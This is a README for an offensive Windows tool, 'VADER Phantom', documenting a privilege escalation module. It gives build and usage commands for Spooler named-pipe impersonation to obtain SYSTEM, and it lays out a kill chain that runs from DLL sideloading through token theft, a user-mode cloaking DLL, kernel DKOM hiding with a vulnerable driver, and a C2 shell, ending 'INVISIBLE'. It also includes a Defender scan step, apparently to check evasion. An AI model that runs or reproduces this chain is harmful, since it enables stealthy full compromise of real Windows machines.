# VADER Phantom — Privilege Escalation Module

## Build

```batch
:: From VS Developer Command Prompt (x64)
call vcvarsall.bat x64
cl.exe /O1 /GS- /utf-8 privesc\phantom_rpc.c /Fe:phantom_rpc.exe /link advapi32.lib
```

## Usage

```powershell
# Check if you have the required privilege
.\phantom_rpc.exe --list

# Spooler pipe impersonation → SYSTEM
.\phantom_rpc.exe --spooler

# Spooler → spawn specific process as SYSTEM
.\phantom_rpc.exe --spooler --cmd powershell.exe

# Generic pipe squat (manual trigger in another terminal)
.\phantom_rpc.exe --pipe \\.\pipe\W32TIME
# Then in another terminal: w32tm /query /status

# Chain: deploy cloak from the SYSTEM shell
.\phantom_rpc.exe --spooler --cmd "cloak_loader.exe cloak.dll"
```

## Requirements

- **SeImpersonatePrivilege** — service accounts (Local Service, Network Service) have this by default
- Administrators have it
- Standard users DO NOT have it

## Kill Chain Position

```
Standard user → DLL sideload into service (FINDING-50/51)
             → phantom_rpc.exe --spooler
             → SYSTEM token stolen
             → cloak_loader.exe cloak.dll (user-mode hiding)
             → kernel_cloak.exe RTCore64.sys <PID> (kernel DKOM)
             → vader_shell.exe (C2)
             → INVISIBLE
```

## Technique Lineage

- PrintSpoofer (itm4n, 2020) — Spooler pipe impersonation
- PhantomRPC (Kaspersky, Black Hat Asia 2026) — RPC architectural weakness
- GodPotato / SigmaPotato — DCOM/RPC token impersonation variants

## Defender Scan

```powershell
& "C:\Program Files\Windows Defender\MpCmdRun.exe" -Scan -ScanType 3 -File (Resolve-Path phantom_rpc.exe)
```
